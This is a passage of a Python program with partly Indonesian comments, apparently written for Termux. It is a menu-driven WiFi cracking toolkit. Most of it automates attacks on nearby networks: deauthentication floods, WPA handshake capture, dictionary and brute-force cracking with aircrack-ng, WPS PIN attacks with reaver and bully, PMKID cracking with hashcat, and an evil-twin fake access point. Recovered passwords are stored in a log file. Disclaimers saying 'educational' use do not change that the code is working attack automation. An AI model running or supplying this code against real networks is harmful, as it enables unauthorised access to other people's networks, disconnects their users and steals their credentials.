            wifi_info = json.loads(result.stdout)
            ssid = wifi_info.get('ssid', 'Not Connected')
            ip = wifi_info.get('ip', 'N/A')
            
            print(f"\n📶 WiFi Status:")
            print(f"  SSID: {ssid}")
            print(f"  IP: {ip}")
            print(f"  Status: {'✅ Connected' if ssid != 'Not Connected' else '❌ Disconnected'}")
        else:
            print("❌ Tidak bisa dapatkan info WiFi")
            
    except Exception as e:
        print(f"❌ Error: {e}")

def speed_test():
    """Test kecepatan internet"""
    if not SPEEDTEST_AVAILABLE:
        print("❌ Speedtest belum terinstall!")
        print("💡 Gunakan 'Auto System Setup' di menu 5")
        return
    
    print("\n🌐 Speed Test...")
    try:
        st = speedtest.Speedtest()
        
        print("📥 Testing download...")
        download = st.download() / 1_000_000
        print(f"📥 Download: {download:.2f} Mbps")
        
        print("📤 Testing upload...")
        upload = st.upload() / 1_000_000
        print(f"📤 Upload: {upload:.2f} Mbps")
        
        print(f"🏓 Ping: {st.results.ping:.2f} ms")
        
    except Exception as e:
        print(f"❌ Error: {e}")

def desktop_wifi_check():
    """WiFi check untuk desktop"""
    print("\n1. 📡 Scan Jaringan")
    print("2. 🌐 Test Koneksi")
    
    choice = input("Pilih opsi (1-2): ").strip()
    
    if choice == "1":
        print("ℹ️  Fitur scan WiFi desktop dalam pengembangan")
    elif choice == "2":
        speed_test()
    else:
        print("❌ Pilihan tidak valid!")

def setup_wifi_cracking():
    """Setup environment untuk WiFi cracking"""
    print("\n🔧 SETUP WIFI CRACKING ENVIRONMENT")
    print("=" * 50)
    
    required_tools = [
        ("aircrack-ng", "aircrack-ng"),
        ("reaver", "reaver"), 
        ("bully", "bully"),
        ("crunch", "crunch"),
        ("hashcat", "hashcat"),
        ("pyrit", "pyrit")
    ]
    
    missing_tools = []
    
    for tool, pkg_name in required_tools:
        try:
            result = subprocess.run([tool, "--version"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print(f"✅ {tool}: Installed")
            else:
                print(f"❌ {tool}: Missing")
                missing_tools.append(pkg_name)
        except:
            print(f"❌ {tool}: Missing")
            missing_tools.append(pkg_name)
    
    if missing_tools:
        print(f"\n📦 Installing missing tools...")
        for tool in missing_tools:
            try:
                subprocess.run(["pkg", "install", "-y", tool], check=True)
                print(f"✅ {tool}: Installed")
            except:
                print(f"❌ Failed to install {tool}")
    else:
        print("\n🎉 All tools are ready!")

def advanced_wifi_scan():
    """Advanced WiFi scanning dengan berbagai metode"""
    print("\n📡 ADVANCED WIFI SCANNING")
    print("=" * 50)
    
    networks = []
    
    # Method 1: Menggunakan airodump-ng
    try:
        print("\n🔄 Method 1: Airodump-ng Scan...")
        # Monitor mode scan
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        time.sleep(2)
        
        # Start monitoring
        scan_proc = subprocess.Popen([
            "airodump-ng", 
            "--write", f"{CRACK_LOG_DIR}/scan",
            "--output-format", "csv",
            "wlan0"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(10)  # Scan selama 10 detik
        scan_proc.terminate()
        
        # Parse results
        if os.path.exists(f"{CRACK_LOG_DIR}/scan-01.csv"):
            with open(f"{CRACK_LOG_DIR}/scan-01.csv", 'r') as f:
                lines = f.readlines()
                for line in lines:
                    if 'Station' in line:
                        break
                    parts = line.split(',')
                    if len(parts) > 13 and parts[0].strip():
                        network = {
                            'bssid': parts[0].strip(),
                            'essid': parts[13].strip(),
                            'channel': parts[3].strip(),
                            'encryption': parts[5].strip(),
                            'power': parts[8].strip()
                        }
                        networks.append(network)
            
            print(f"✅ Found {len(networks)} networks with airodump-ng")
            
    except Exception as e:
        print(f"❌ Airodump-ng failed: {e}")
    
    # Method 2: Menggunakan termux-wifi-scaninfo (fallback)
    if not networks:
        try:
            print("\n🔄 Method 2: Termux API Scan...")
            result = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=15)
            if result.returncode == 0:
                wifi_data = json.loads(result.stdout)
                for net in wifi_data:
                    networks.append({
                        'bssid': net.get('bssid', 'N/A'),
                        'essid': net.get('ssid', 'Hidden'),
                        'channel': str(net.get('frequency_mhz', 0)),
                        'encryption': 'WPA2' if 'WPA' in str(net) else 'Unknown',
                        'power': str(net.get('rssi', 0))
                    })
                print(f"✅ Found {len(networks)} networks with Termux API")
        except Exception as e:
            print(f"❌ Termux API scan failed: {e}")
    
    # Display results
    if networks:
        print(f"\n📊 SCAN RESULTS: {len(networks)} NETWORKS FOUND")
        print("=" * 80)
        print(f"{'NO':<3} {'SSID':<20} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'ENC':<10}")
        print("-" * 80)
        
        for i, net in enumerate(networks[:20], 1):  # Limit to 20 networks
            ssid = net['essid'][:18] + '..' if len(net['essid']) > 18 else net['essid']
            bssid = net['bssid'][:16] if net['bssid'] != 'N/A' else 'N/A'
            
            print(f"{i:<3} {ssid:<20} {bssid:<18} {net['channel']:<4} {net['power']:<6} {net['encryption']:<10}")
    
    return networks

def wpa2_psk_crack():
    """WPA2-PSK Cracking menggunakan berbagai metode"""
    print("\n🔓 WPA2-PSK CRACKING TOOLKIT")
    print("=" * 50)
    
    networks = advanced_wifi_scan()
    if not networks:
        print("❌ No networks found to crack")
        return
    
    # Pilih target network
    try:
        target_num = int(input("\n🎯 Select target network number: ")) - 1
        if 0 <= target_num < len(networks):
            target = networks[target_num]
            print(f"\n🎯 TARGET SELECTED:")
            print(f"   SSID: {target['essid']}")
            print(f"   BSSID: {target['bssid']}")
            print(f"   Channel: {target['channel']}")
            print(f"   Encryption: {target['encryption']}")
        else:
            print("❌ Invalid selection")
            return
    except ValueError:
        print("❌ Please enter a valid number")
        return
    
    # Pilih metode cracking
    print("\n🔧 SELECT CRACKING METHOD:")
    print("1. Dictionary Attack (Fast)")
    print("2. Brute Force (Comprehensive)")
    print("3. WPS Pin Attack")
    print("4. PMKID Attack")
    print("5. Evil Twin Attack")
    
    try:
        method = int(input("\nSelect method (1-5): "))
    except ValueError:
        print("❌ Invalid selection")
        return
    
    if method == 1:
        dictionary_attack(target)
    elif method == 2:
        brute_force_attack(target)
    elif method == 3:
        wps_attack(target)
    elif method == 4:
        pmkid_attack(target)
    elif method == 5:
        evil_twin_attack(target)
    else:
        print("❌ Invalid method selected")

def dictionary_attack(target):
    """Dictionary attack pada WPA2"""
    print(f"\n📚 DICTIONARY ATTACK ON {target['essid']}")
    print("=" * 50)
    
    # Capture handshake terlebih dahulu
    print("🔄 Step 1: Capturing WPA handshake...")
    
    try:
        # Deauthenticate clients untuk trigger handshake
        print("   Sending deauth packets...")
        deauth_proc = subprocess.Popen([
            "aireplay-ng", 
            "--deauth", "10",
            "-a", target['bssid'],
            "wlan0"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Capture handshake
        print("   Capturing handshake...")
        capture_proc = subprocess.Popen([
            "airodump-ng",
            "--bssid", target['bssid'],
            "--channel", target['channel'],
            "--write", f"{CRACK_LOG_DIR}/handshake",
            "wlan0"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(15)
        capture_proc.terminate()
        deauth_proc.terminate()
        
        # Cek jika handshake berhasil di-capture
        handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
        if os.path.exists(handshake_file):
            print("✅ WPA handshake captured!")
            
            # Dictionary attack dengan aircrack-ng
            print("🔄 Step 2: Running dictionary attack...")
            
            # Gunasi wordlist default atau buat custom
            wordlists = [
                "/usr/share/wordlists/rockyou.txt",
                "/usr/share/wordlists/passwords.txt",
                f"{CRACK_LOG_DIR}/custom_wordlist.txt"
            ]
            
            # Buat custom wordlist jika tidak ada
            if not os.path.exists(wordlists[2]):
                create_custom_wordlist()
            
            for wordlist in wordlists:
                if os.path.exists(wordlist):
                    print(f"   Trying wordlist: {os.path.basename(wordlist)}")
                    
                    result = subprocess.run([
                        "aircrack-ng",
                        handshake_file,
                        "-w", wordlist,
                        "-l", f"{CRACK_LOG_DIR}/password_found.txt"
                    ], capture_output=True, text=True, timeout=300)
                    
                    if "KEY FOUND" in result.stdout:
                        print("🎉 PASSWORD CRACKED!")
                        # Extract password dari output
                        lines = result.stdout.split('\n')
                        for line in lines:
                            if "KEY FOUND" in line:
                                password = line.split('[')[1].split(']')[0]
                                print(f"🔑 Password: {password}")
                                
                                # Save to file
                                with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                                    f.write(f"{target['essid']} : {password} : {datetime.now()}\n")
                                break
                        return
                    else:
                        print(f"   ❌ No password found in {os.path.basename(wordlist)}")
            
            print("❌ Password not found in any wordlist")
            
        else:
            print("❌ Failed to capture WPA handshake")
            
    except Exception as e:
        print(f"❌ Dictionary attack failed: {e}")

def brute_force_attack(target):
    """Brute force attack dengan pattern yang realistis"""
    print(f"\n💪 BRUTE FORCE ATTACK ON {target['essid']}")
    print("=" * 50)
    
    print("🔄 Generating smart password patterns...")
    
    # Buat pattern berdasarkan SSID (common patterns)
    ssid = target['essid'].lower().replace(' ', '')
    patterns = []
    
    # Smart patterns berdasarkan SSID
    patterns.extend([
        # Basic patterns
        f"{ssid}", f"{ssid}123", f"{ssid}1234", f"{ssid}12345",
        f"{ssid}2023", f"{ssid}2024", f"{ssid}2025",
        f"{ssid}!", f"{ssid}@", f"{ssid}#",
        
        # Common password patterns
        f"password", f"password123", f"password{ssid}",
        f"admin", f"admin123", f"admin{ssid}",
        f"12345678", f"123456789", f"1234567890",
        f"qwerty", f"qwerty123", f"qwertyuiop",
        f"letmein", f"welcome", f"hello{ssid}",
        
        # Number sequences
        f"11111111", f"88888888", f"99999999",
        f"12341234", f"123123123", f"00000000",
        
        # Date patterns
        f"01012000", f"01012024", f"01011980",
        f"25081995", f"31121999",
    ])
    
    # Tambahkan patterns berdasarkan karakteristik SSID
    if any(char.isdigit() for char in ssid):
        # Jika SSID mengandung angka
        numbers = ''.join(filter(str.isdigit, ssid))
        if numbers:
            patterns.extend([f"{numbers}", f"{numbers}123", f"{numbers}{numbers}"])
    
    # Simpan patterns ke file
    pattern_file = f"{CRACK_LOG_DIR}/brute_patterns.txt"
    with open(pattern_file, "w") as f:
        for pattern in patterns:
            f.write(pattern + "\n")
    
    print(f"✅ Generated {len(patterns)} smart patterns")
    
    # Gunakan crunch dengan parameter yang lebih realistis
    try:
        print("🔄 Generating additional combinations with crunch (optimized)...")
        
        # Parameter yang lebih realistis untuk mobile device
        crunch_proc = subprocess.Popen([
            "crunch", "6", "8", "1234567890",  # Hanya angka, panjang 6-8
            "-o", f"{CRACK_LOG_DIR}/crunch_output.txt"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Timeout lebih pendek, hanya generate 10 detik
        try:
            stdout, stderr = crunch_proc.communicate(timeout=10)
            print("✅ Crunch generation completed")
        except subprocess.TimeoutExpired:
            print("⏰ Crunch timeout - using generated data so far")
            crunch_proc.terminate()
        
        # Combine files
        combined_file = f"{CRACK_LOG_DIR}/combined_wordlist.txt"
        total_lines = 0
        
        with open(combined_file, "w") as outfile:
            # Tambahkan patterns
            with open(pattern_file, "r") as infile:
                patterns_content = infile.read()
                outfile.write(patterns_content)
                total_lines += len(patterns_content.splitlines())
            
            # Tambahkan crunch output jika ada (maksimal 5000 lines)
            if os.path.exists(f"{CRACK_LOG_DIR}/crunch_output.txt"):
                with open(f"{CRACK_LOG_DIR}/crunch_output.txt", "r") as infile:
                    lines_added = 0
                    for line in infile:
                        if lines_added < 5000:  # Batasi agar tidak terlalu besar
                            outfile.write(line.strip() + "\n")
                            lines_added += 1
                            total_lines += 1
                        else:
                            break
                print(f"✅ Added {lines_added} lines from crunch")
        
        print(f"📊 Total wordlist size: {total_lines} passwords")
        
        # Cek jika handshake file ada
        handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
        if not os.path.exists(handshake_file):
            print("❌ No handshake file found. Capturing handshake first...")
            if not capture_handshake(target):
                print("❌ Failed to capture handshake")
                return
        
        print("🔄 Starting optimized brute force attack...")
        
        result = subprocess.run([
            "aircrack-ng",
            handshake_file,
            "-w", combined_file,
            "-l", f"{CRACK_LOG_DIR}/brute_password.txt"
        ], capture_output=True, text=True, timeout=300)  # Timeout 5 menit
        
        if "KEY FOUND" in result.stdout:
            print("🎉 PASSWORD CRACKED WITH BRUTE FORCE!")
            lines = result.stdout.split('\n')
            for line in lines:
                if "KEY FOUND" in line:
                    password = line.split('[')[1].split(']')[0]
                    print(f"🔑 Password: {password}")
                    with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                        f.write(f"{target['essid']} : {password} : BRUTE_FORCE : {datetime.now()}\n")
                    break
        else:
            print("❌ Brute force attack failed - password not in wordlist")
            print("💡 Try dictionary attack or WPS attack instead")
        
    except subprocess.TimeoutExpired:
        print("⏰ Brute force attack timed out")
        print("💡 Wordlist too large for mobile device")
    except Exception as e:
        print(f"❌ Brute force attack failed: {e}")

def capture_handshake(target):
    """Capture WPA handshake untuk attack"""
    print("🔄 Capturing WPA handshake...")
    
    try:
        # Deauthenticate clients untuk trigger handshake
        print("   Sending deauth packets...")
        deauth_proc = subprocess.Popen([
            "aireplay-ng", 
            "--deauth", "5",  # Kurangi jumlah deauth
            "-a", target['bssid'],
            "wlan0"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Capture handshake
        print("   Capturing handshake (10 seconds)...")
        capture_proc = subprocess.Popen([
            "airodump-ng",
            "--bssid", target['bssid'],
            "--channel", target['channel'],
            "--write", f"{CRACK_LOG_DIR}/handshake",
            "wlan0"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(10)
        capture_proc.terminate()
        deauth_proc.terminate()
        
        # Cek jika handshake berhasil di-capture
        handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
        if os.path.exists(handshake_file):
            # Verifikasi handshake
            result = subprocess.run([
                "aircrack-ng",
                handshake_file,
                "-w", "/dev/null"  # Test dengan wordlist kosong
            ], capture_output=True, text=True, timeout=30)
            
            if "1 handshake" in result.stdout:
                print("✅ WPA handshake captured and verified!")
                return True
            else:
                print("❌ No valid handshake captured")
                return False
        else:
            print("❌ Handshake file not created")
            return False
            
    except Exception as e:
        print(f"❌ Handshake capture failed: {e}")
        return False

def smart_brute_force_attack(target):
    """Smart brute force tanpa menggunakan crunch"""
    print(f"\n🧠 SMART BRUTE FORCE ATTACK ON {target['essid']}")
    print("=" * 50)
    
    # Generate smart patterns berdasarkan SSID analysis
    ssid = target['essid'].lower()
    wordlist = generate_smart_patterns(ssid)
    
    print(f"✅ Generated {len(wordlist)} intelligent patterns")
    
    # Save to file
    wordlist_file = f"{CRACK_LOG_DIR}/smart_wordlist.txt"
    with open(wordlist_file, "w") as f:
        for password in wordlist:
            f.write(password + "\n")
    
    # Lakukan attack
    handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
    if not os.path.exists(handshake_file):
        print("❌ No handshake file found")
        return
    
    print("🔄 Starting smart brute force attack...")
    
    try:
        result = subprocess.run([
            "aircrack-ng",
            handshake_file,
            "-w", wordlist_file,
            "-l", f"{CRACK_LOG_DIR}/smart_password.txt"
        ], capture_output=True, text=True, timeout=180)  # 3 menit timeout
        
        if "KEY FOUND" in result.stdout:
            print("🎉 PASSWORD CRACKED WITH SMART BRUTE FORCE!")
            lines = result.stdout.split('\n')
            for line in lines:
                if "KEY FOUND" in line:
                    password = line.split('[')[1].split(']')[0]
                    print(f"🔑 Password: {password}")
                    with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                        f.write(f"{target['essid']} : {password} : SMART_BRUTE_FORCE : {datetime.now()}\n")
                    break
        else:
            print("❌ Smart brute force failed")
            
    except subprocess.TimeoutExpired:
        print("⏰ Smart brute force timed out")

def generate_smart_patterns(ssid):
    """Generate smart patterns berdasarkan analisis SSID"""
    patterns = set()
    
    # Basic SSID variations
    patterns.add(ssid)
    patterns.add(ssid + "123")
    patterns.add(ssid + "1234")
    patterns.add(ssid + "12345")
    patterns.add(ssid + "2024")
    patterns.add(ssid + "!")
    
    # Common substitutions
    if 'a' in ssid: patterns.add(ssid.replace('a', '4'))
    if 'e' in ssid: patterns.add(ssid.replace('e', '3'))
    if 'i' in ssid: patterns.add(ssid.replace('i', '1'))
    if 'o' in ssid: patterns.add(ssid.replace('o', '0'))
    if 's' in ssid: patterns.add(ssid.replace('s', '5'))
    
    # Capitalization variations
    patterns.add(ssid.upper())
    patterns.add(ssid.capitalize())
    
    # Remove spaces and special chars
    clean_ssid = ''.join(e for e in ssid if e.isalnum())
    if clean_ssid != ssid:
        patterns.add(clean_ssid)
        patterns.add(clean_ssid + "123")
    
    return list(patterns)

def wps_attack(target):
    """WPS Pin attack menggunakan reaver atau bully"""
    print(f"\n📟 WPS PIN ATTACK ON {target['essid']}")
    print("=" * 50)
    
    print("🔍 Checking if WPS is enabled...")
    
    try:
        # Coba dengan reaver
        print("🔄 Trying Reaver attack...")
        reaver_proc = subprocess.Popen([
            "reaver",
            "-i", "wlan0",
            "-b", target['bssid'],
            "-vv",
            "-K", "1"  # Pixie dust attack
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Monitor output untuk progress
        for line in iter(reaver_proc.stdout.readline, ''):
            print(f"   {line.strip()}")
            if "WPS pin:" in line:
                pin = line.split("WPS pin:")[1].strip()
                print(f"🎉 WPS PIN FOUND: {pin}")
                reaver_proc.terminate()
                
                # Coba dapatkan password dengan pin
                get_password_with_pin(target, pin)
                return
                
            elif "rate limiting" in line.lower():
                print("❌ AP is rate limiting, trying bully...")
                reaver_proc.terminate()
                break
        
        # Jika reaver gagal, coba bully
        print("🔄 Trying Bully attack...")
        bully_proc = subprocess.Popen([
            "bully",
            "wlan0",
            "-b", target['bssid'],
            "-v", "3"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(bully_proc.stdout.readline, ''):
            print(f"   {line.strip()}")
            if "pin is" in line.lower():
                pin = line.split("pin is")[1].strip()
                print(f"🎉 WPS PIN FOUND: {pin}")
                bully_proc.terminate()
                get_password_with_pin(target, pin)
                return
        
        print("❌ WPS attack failed")
        
    except Exception as e:
        print(f"❌ WPS attack failed: {e}")

def get_password_with_pin(target, pin):
    """Dapatkan password menggunakan WPS pin"""
    try:
        print(f"🔄 Retrieving password with PIN {pin}...")
        
        result = subprocess.run([
            "reaver",
            "-i", "wlan0", 
            "-b", target['bssid'],
            "-p", pin,
            "-s", f"{CRACK_LOG_DIR}/reaver_output"
        ], capture_output=True, text=True, timeout=60)
        
        if "WPA PSK:" in result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                if "WPA PSK:" in line:
                    password = line.split("WPA PSK:")[1].strip().strip("'")
                    print(f"🎉 PASSWORD FOUND: {password}")
                    with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                        f.write(f"{target['essid']} : {password} : WPS_PIN : {datetime.now()}\n")
                    return
        
        print("❌ Failed to retrieve password with PIN")
        
    except Exception as e:
        print(f"❌ Error retrieving password: {e}")

def pmkid_attack(target):
    """PMKID attack tanpa perlu handshake"""
    print(f"\n🎯 PMKID ATTACK ON {target['essid']}")
    print("=" * 50)
    
    try:
        print("🔄 Capturing PMKID...")
        
        # Gunakan hcxdumptool untuk capture PMKID
        pmkid_proc = subprocess.Popen([
            "hcxdumptool",
            "-i", "wlan0",
            "--enable_status=1",
            "-o", f"{CRACK_LOG_DIR}/pmkid_capture.pcapng"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        time.sleep(30)  # Capture selama 30 detik
        pmkid_proc.terminate()
        
        # Convert ke format hashcat
        print("🔄 Converting to hashcat format...")
        subprocess.run([
            "hcxpcaptool",
            "-z", f"{CRACK_LOG_DIR}/pmkid_hash.txt",
            f"{CRACK_LOG_DIR}/pmkid_capture.pcapng"
        ], capture_output=True)
        
        if os.path.exists(f"{CRACK_LOG_DIR}/pmkid_hash.txt"):
            print("✅ PMKID hash captured!")
            
            # Crack dengan hashcat
            print("🔄 Cracking PMKID with hashcat...")
            result = subprocess.run([
                "hashcat",
                "-m", "16800",
                f"{CRACK_LOG_DIR}/pmkid_hash.txt",
                "/usr/share/wordlists/rockyou.txt",
                "--force"
            ], capture_output=True, text=True, timeout=300)
            
            if "Cracked" in result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if ":" in line and len(line.split(':')) == 2:
                        hash_part, password = line.split(':')
                        print(f"🎉 PASSWORD CRACKED: {password}")
                        with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                            f.write(f"{target['essid']} : {password} : PMKID : {datetime.now()}\n")
                        return
            
            print("❌ PMKID attack failed")
        else:
            print("❌ No PMKID captured")
            
    except Exception as e:
        print(f"❌ PMKID attack failed: {e}")

def evil_twin_attack(target):
    """Evil Twin attack untuk capture credentials"""
    print(f"\n👹 EVIL TWIN ATTACK ON {target['essid']}")
    print("=" * 50)
    
    print("⚠️  This method creates a fake access point")
    print("⚠️  For educational purposes only!")
    
    try:
        # Setup interface monitor
        print("🔄 Setting up monitor mode...")
        subprocess.run(["airmon-ng", "start", "wlan0"], capture_output=True)
        
        # Create fake AP dengan SSID yang sama
        print("🔄 Creating fake access point...")
        
        # Buat hostapd config
        with open(f"{CRACK_LOG_DIR}/hostapd.conf", "w") as f:
            f.write(f"""
interface=wlan0mon
driver=nl80211
ssid={target['essid']}_FREE
channel={target['channel']}
hw_mode=g
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
""")
        
        # Start fake AP
        ap_proc = subprocess.Popen([
            "hostapd", f"{CRACK_LOG_DIR}/hostapd.conf"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Setup DHCP server
        print("🔄 Setting up DHCP server...")
        subprocess.run([
            "dnsmasq", 
            "-C", "/dev/null",
            "-d",
            "-i", "wlan0mon",
            "--dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("✅ Fake AP is running!")
        print("📡 Waiting for clients to connect...")
        print("💡 Clients may connect thinking it's the real network")
        
        time.sleep(60)  # Run selama 1 menit
        
        # Cleanup
        ap_proc.terminate()
        subprocess.run(["pkill", "dnsmasq"])
        subprocess.run(["airmon-ng", "stop", "wlan0mon"])
        
        print("✅ Evil Twin attack completed")
        print("💡 Check logs for captured credentials")
        
    except Exception as e:
        print(f"❌ Evil Twin attack failed: {e}")

def create_custom_wordlist():
    """Buat custom wordlist berdasarkan common passwords"""
    print("🔄 Creating custom wordlist...")
    
    common_passwords = [
        "password", "password123", "admin", "admin123",
        "12345678", "123456789", "1234567890", "qwerty",
        "abc123", "password1", "12345", "1234",
        "111111", "000000", "123123", "monkey",
        "dragon", "sunshine", "princess", "letmein",
        "welcome", "shadow", "master", "123qwe",
        "654321", "superman", "1qaz2wsx", "password123",
        "iloveyou", "football", "baseball", "whatever", "88888888", "888888888", "99999999", "999999999"
    ]
    
    with open(f"{CRACK_LOG_DIR}/custom_wordlist.txt", "w") as f:
        for pwd in common_passwords:
            f.write(pwd + "\n")
    
    print("✅ Custom wordlist created!")

def wifi_cracking_menu():
    """Menu utama WiFi cracking"""
    while True:
        print("\n" + "=" * 60)
        print("           ADVANCED WIFI CRACKING TOOLKIT")
        print("=" * 60)
        print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
        print("=" * 60)
        
        print("\n🔧 MAIN MENU:")
        print("1. 🔧 Setup Cracking Environment")
        print("2. 📡 Advanced WiFi Scan")
        print("3. 🔓 WPA2-PSK Cracking Toolkit")
        print("4. 📊 View Cracked Passwords")
        print("5. 🛡️  WiFi Security Audit")
        print("6. 🏠 Back to Main Menu")
        
        try:
            choice = input("\nSelect option (1-6): ").strip()
            
            if choice == "1":
                setup_wifi_cracking()
            elif choice == "2":
                advanced_wifi_scan()
            elif choice == "3":
                wpa2_psk_crack()
            elif choice == "4":
                view_cracked_passwords()
            elif choice == "5":
                wifi_security_audit()
            elif choice == "6":
                break
            else:
                print("❌ Invalid selection")
                
        except KeyboardInterrupt:
            print("\n\n⚠️  Returning to main menu...")
            break
        except Exception as e:
            print(f"❌ Error: {e}")

def view_cracked_passwords():
    """Lihat password yang berhasil di-crack"""
    cracked_file = f"{CRACK_LOG_DIR}/cracked_passwords.txt"
    
    if os.path.exists(cracked_file):
        print(f"\n📋 CRACKED PASSWORDS:")
        print("=" * 60)
        with open(cracked_file, "r") as f:
            content = f.read()
            if content:
                print(content)
            else:
                print("No passwords cracked yet")
    else:
        print("❌ No cracked passwords file found")

def wifi_security_audit():
    """Audit keamanan WiFi"""
    print("\n🛡️  WIFI SECURITY AUDIT")
    print("=" * 50)
    
    networks = advanced_wifi_scan()
    if not networks:
        return
    
    print("\n🔍 SECURITY ANALYSIS:")
    
    for net in networks[:10]:  # Analyze first 10 networks
        security_issues = []
        
        # Check encryption
        if 'WEP' in net['encryption']:
            security_issues.append("❌ WEP - Easily crackable")
        if 'WPA' in net['encryption'] and 'WPA2' not in net['encryption']:
            security_issues.append("⚠️  WPA - Vulnerable to attacks")
        if 'OPEN' in net['encryption']:
            security_issues.append("🔓 OPEN - No security")
        
        # Check signal strength
        try:
            power = int(net['power'])
            if power > -50:
                security_issues.append("📡 Strong signal - More visible to attackers")
        except:
            pass
        
        # Check if hidden
        if net['essid'] == 'Hidden':
            security_issues.append("👻 Hidden SSID - Basic protection")
        
        # Display results
        if security_issues:
            print(f"\n📶 {net['essid']}:")
            for issue in security_issues:
                print(f"   {issue}")

# Tambahkan menu ini ke main program utama
def main():
    """Menu utama program yang diperbarui"""
    setup_logging()
    log_message("Program started")
    
    while True:
        clear_screen()
        display_header()
        
        req_status = "✅" if REQUESTS_AVAILABLE else "❌"
        speed_status = "✅" if SPEEDTEST_AVAILABLE else "❌"
        
        print("\n📋 ADVANCED MAIN MENU:")
        print("1. 🔗 Website Checker")
        print("2. 🔤 Random String Generator") 
        print("3. 📡 WiFi Checker & Tools")
        print("4. 🔓 WiFi Cracking Toolkit")
        print("5. 💻 System Information")
        print("6. 🚀 System Setup & Requirements")
        print("7. 🚪 Exit")
        
        print(f"\nStatus: requests {req_status} | speedtest {speed_status}")
        print(f"Logs: {LOG_FILE}")
        
        try:
            choice = input("\nSelect option (1-7): ").strip()
            log_message(f"User selected menu: {choice}")
            
            if choice == "1":
                website_checker()
            elif choice == "2":
                random_string_generator()
            elif choice == "3":
                wifi_checker()
            elif choice == "4":
                wifi_cracking_menu()
            elif choice == "5":
                show_detailed_system_info()
            elif choice == "6":
                system_setup_requirements()
            elif choice == "7":
                print("\n👋 Thank you for using the program!")
                log_message("Program exited")
                break
            else:
                print("\n❌ Invalid selection!")
                
        except KeyboardInterrupt:
            print("\n\n⚠️  Returning to main menu...")
            continue
        
        input("\nPress Enter to continue...")
                
            
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Program terminated by user")
        log_message("Program interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        log_message(f"Program error: {e}")
